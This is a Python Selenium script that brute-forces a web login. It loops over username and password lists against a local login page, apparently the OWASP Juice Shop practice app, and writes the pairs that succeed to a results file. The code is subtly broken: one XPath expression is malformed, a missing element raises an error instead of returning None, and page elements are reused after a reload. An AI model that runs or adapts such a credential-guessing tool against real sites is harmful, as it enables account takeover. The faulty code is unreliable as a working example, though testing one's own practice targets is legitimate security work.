from selenium import webdriver
from selenium.webdriver.common.by import By
import time

driver = webdriver.Firefox()

with open('usernames.txt', 'r') as file:
    usernames = [line.strip() for line in file.readlines()]

with open('passwords.txt', 'r') as file:
    passwords = [line.strip() for line in file.readlines()]

base_url = 'http://localhost:3000/#/login'

results = []

driver.get(base_url)

time.sleep(1)

email_input = driver.find_element("xpath", '//input[@id="email"]')
password_input = driver.find_element("xpath", '//input[@id="password"]')
login_button = driver.find_element("xpath", '//button[@id="loginButton"]')

#for owasp
dismiss_button = driver.find_element("xpath", "//button[contains(@class, 'close-dialog']")
if dismiss_button:
    dismiss_button.click()

print("Starting testing...")
for username in usernames:
    for password in passwords:
        email_input.clear()
        password_input.clear()

        email_input.send_keys(username)
        password_input.send_keys(password)

        login_button.click()

        if driver.current_url != base_url:
            results.append((username, password))
            driver.get(base_url)

with open('results.txt', 'w') as result_file:
    result_file.write("Potential vulnerabilities\n:")
    for username, password in results:
        result_file.write(f"USERNAME: {username}, PASSWORD: {password}\n")

print("Testing completed. Results saved to 'results.txt'.")
